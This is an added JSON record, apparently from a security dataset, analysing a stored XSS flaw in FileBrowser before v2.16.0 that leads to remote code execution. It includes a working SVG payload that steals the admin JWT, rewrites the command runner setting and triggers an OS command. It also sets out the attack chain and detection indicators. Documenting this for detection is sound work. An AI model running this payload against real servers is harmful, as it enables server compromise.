@@ -1,0 +1,92 @@
+{
+  "package_info": {
+    "package_name": "FileBrowser",
+    "package_manager": "standalone (not a package manager, but a web application)",
+    "package_versions": "prior to v2.16.0",
+    "why_malicious": "A stored XSS vulnerability allows authenticated users to upload malicious SVG files containing embedded JavaScript. When an administrator previews the SVG, the JavaScript executes in the admin's browser context, abusing FileBrowser's command runner feature to achieve remote code execution (RCE) on the server. This enables attackers to run arbitrary OS commands with the privileges of the FileBrowser process, compromising server integrity."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "admin previews uploaded SVG file in browser (runtime, post-upload)",
+        "file_location": "user-uploaded SVG file (e.g., exploit.svg) stored on server and accessed via FileBrowser web interface",
+        "required_permissions": [
+          "ability to upload files (authenticated user)",
+          "admin session (to trigger XSS via preview)",
+          "filesystem access (for command runner to execute OS commands)",
+          "network access (for API requests within admin's browser context)"
+        ]
+      },
+      "code_snippet": "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<script type=\"text/javascript\">\nvar xhr = new XMLHttpRequest();\nxhr.open(\"PUT\", document.location['origin'] + \"/api/settings\", true);\nxhr.setRequestHeader(\"Accept\", \"*/*\");\nxhr.setRequestHeader(\"X-Auth\", localStorage['jwt']);\nxhr.setRequestHeader(\"Accept-Language\", 'en,es;q=0.5');\nxhr.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\");\nxhr.withCredentials = true;\nvar body = '{\"commands\":{\"before_upload\":\"touch /tmp/rce.txt\"}}';\nxhr.send(body);\n\nsetTimeout(() => { console.log(); }, 2000);\n\nvar xhr2 = new XMLHttpRequest();\nxhr2.open(\"POST\", document.location['origin'] + \"/api/resources/\" + Math.random().toString(36).substring(7) + \".html?override=true\", true);\nxhr2.setRequestHeader(\"Accept\", \"*/*\");\nxhr2.setRequestHeader(\"X-Auth\", localStorage['jwt']);\nxhr2.setRequestHeader(\"Content-Type\", \"text/html\");\nxhr2.withCredentials = true;\nxhr2.send(\"abcd\");\n</script>\n</svg>",
+      "code_language": "javascript (embedded in SVG)",
+      "code_behavior": "When an administrator previews the uploaded SVG file in the browser, the embedded JavaScript executes in the admin's session, sending an authenticated PUT request to the /api/settings endpoint to set the 'before_upload' command to 'touch /tmp/rce.txt', then uploads a file to trigger the command runner, resulting in the creation of /tmp/rce.txt on the server and demonstrating remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The SVG file contains embedded JavaScript that leverages the admin's authentication to modify server settings and trigger OS command execution via the command runner, which is not expected or permitted from user-uploaded files.",
+        "violated_expectations": "Normally, uploaded SVG files should only contain static image data and should never execute JavaScript in the context of an authenticated admin session, nor should they be able to modify server configuration or trigger OS-level commands.",
+        "similar_legitimate_use": "Legitimate SVG files may include JavaScript for interactive graphics, but such scripts should not have access to authentication tokens, nor should they perform privileged API requests or alter server-side command execution settings.",
+        "key_indicators": [
+          "SVG file upload containing <script> tags with JavaScript",
+          "JavaScript accessing localStorage['jwt'] for authentication",
+          "API requests to /api/settings with 'before_upload' or other command runner parameters set to shell commands",
+          "Triggering file uploads to /api/resources/ to activate command runner",
+          "Creation of files (e.g., /tmp/rce.txt) on the server as a result of file upload"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker uploads a malicious SVG file containing a JavaScript XSS payload to the FileBrowser instance.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The payload is stored on the server and awaits interaction by an administrator."
+    },
+    {
+      "step": 2,
+      "action": "Administrator previews or opens the malicious SVG file via the FileBrowser web interface, causing the embedded JavaScript to execute in the admin's browser context.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The JavaScript executes with the admin's session and authentication, enabling privileged actions."
+    },
+    {
+      "step": 3,
+      "action": "The JavaScript sends an authenticated PUT request to /api/settings, setting the 'before_upload' command to execute 'touch /tmp/rce.txt' (or any arbitrary OS command).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The server is now configured to execute arbitrary OS commands on subsequent file uploads."
+    },
+    {
+      "step": 4,
+      "action": "The JavaScript uploads a file to /api/resources/ to trigger the 'before_upload' command, resulting in OS command execution on the server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Arbitrary code execution is achieved (RCE), and attacker-controlled commands run with the privileges of the FileBrowser process."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "SVG file uploads containing <script> tags with JavaScript code",
+      "API requests to /api/settings with 'before_upload' or other command runner parameters set to shell commands",
+      "Unexpected file creation in /tmp or other sensitive directories immediately following file upload events",
+      "Use of localStorage['jwt'] in client-side scripts within SVG previews",
+      "Authenticated API requests originating from browser sessions during file preview"
+    ],
+    "file_indicators": [
+      "SVG files with embedded JavaScript (<script> tags) uploaded by non-admin users",
+      "Files named exploit.svg or similar, especially if uploaded shortly before admin preview",
+      "Presence of /tmp/rce.txt or other files created by shell commands after file uploads"
+    ],
+    "network_indicators": [
+      "PUT requests to /api/settings from browser sessions, especially those modifying command runner settings",
+      "POST requests to /api/resources/ with random filenames from admin browser sessions",
+      "API requests containing authentication tokens (e.g., X-Auth header with JWT) originating from SVG file previews"
+    ],
+    "how_to_detect": "Monitor for SVG uploads containing <script> tags, particularly those making API calls to /api/settings or /api/resources. Alert on any changes to command runner settings via API from browser sessions, especially when initiated during file preview. Watch for file creation in /tmp or other sensitive locations following file uploads. Implement strict Content Security Policy (CSP) headers to block inline scripts in SVGs, restrict file types that can be previewed in the browser, and audit for unexpected API activity from admin sessions during file preview events."
+  }
+}
